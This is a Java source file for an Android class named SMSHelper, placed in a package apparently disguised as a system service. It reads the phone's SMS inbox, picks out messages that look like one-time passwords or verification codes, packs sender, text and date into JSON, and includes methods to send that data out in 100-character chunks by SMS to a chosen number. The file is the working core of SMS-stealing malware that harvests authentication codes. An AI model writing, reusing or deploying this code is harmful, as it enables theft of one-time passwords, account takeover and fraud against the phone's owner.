package android.service.sms.helpers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SMSHelper {

    private static final String TAG = "MADARA";
    private final Context context;

    public SMSHelper(Context context) {
        this.context = context;
    }

//    ----------------------------------------------------------------------------------------------

    public void getOTPs(int count, OnSMSRetrieve onSMSRetrieve) {

        new Thread(() -> {
            JSONArray list = new JSONArray();
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            String[] projection = new String[]{"address", "body", "date"};
            String sortOrder = "date DESC";

            try (Cursor cursor = context.getContentResolver().query(uriSMSURI, projection, null, null, sortOrder)) {
                if (cursor != null) {
                    int addressIndex = cursor.getColumnIndexOrThrow("address");
                    int bodyIndex = cursor.getColumnIndexOrThrow("body");
                    int dateIndex = cursor.getColumnIndexOrThrow("date");

                    while (cursor.moveToNext() && list.length() < count) {

                        String phoneNo = cursor.getString(addressIndex);
                        String msg = cursor.getString(bodyIndex);
                        long date = cursor.getLong(dateIndex);

                        if (isOTPMessage(msg)){
                            JSONObject sms = new JSONObject();
                            sms.put("phoneNo", phoneNo);
                            sms.put("msg", msg);
                            sms.put("date", date);
                            list.put(sms);
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error retrieving SMS messages", e);
            }

            Log.d(TAG, "getOTPs: " + list);

            try {
                onSMSRetrieve.onCompleted(list);
            } catch (JSONException e) {
                onSMSRetrieve.onFailed(e);
            }

        }).start();
    }

//    ----------------------------------------------------------------------------------------------

    public boolean sendSMS(String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "sendSMS: ", e);
            return false;
        }
    }

    public boolean sendChunkedSMS(String phoneNumber, String jsonString) {

        final int MAX_SMS_LENGTH = 100; // SMS character limit
        boolean success = true;

        SmsManager smsManager = SmsManager.getDefault();

        // Split the JSON string into chunks of MAX_SMS_LENGTH
        int length = jsonString.length();

        for (int start = 0; start < length; start += MAX_SMS_LENGTH) {

            int end = Math.min(length, start + MAX_SMS_LENGTH);

            String chunk = jsonString.substring(start, end);

            try {
                smsManager.sendTextMessage(phoneNumber, null, chunk, null, null);
            } catch (Exception e) {
                Log.e(TAG, "sendMultipleSMS: ", e);
                success = false;
            }
        }

        return success;
    }


//    ----------------------------------------------------------------------------------------------

    private boolean isOTPMessage(String message) {
        // Define common OTP patterns or keywords
        String[] otpKeywords = {"OTP", "code", "verify", "password", "authentication", "secret", "pin"};

        // Check if the message contains any of the keywords
        for (String keyword : otpKeywords) {
            if (message.toLowerCase().contains(keyword.toLowerCase())) {
                return true;
            }
        }

        // Check for numeric OTP patterns (4 to 8 digits)
        Pattern pattern = Pattern.compile("\\b\\d{4,8}\\b");
        Matcher matcher = pattern.matcher(message);
        return matcher.find();
    }

//    ----------------------------------------------------------------------------------------------

    public interface OnSMSRetrieve {
        void onCompleted(JSONArray list) throws JSONException;
        void onFailed(Exception e);
    }
}
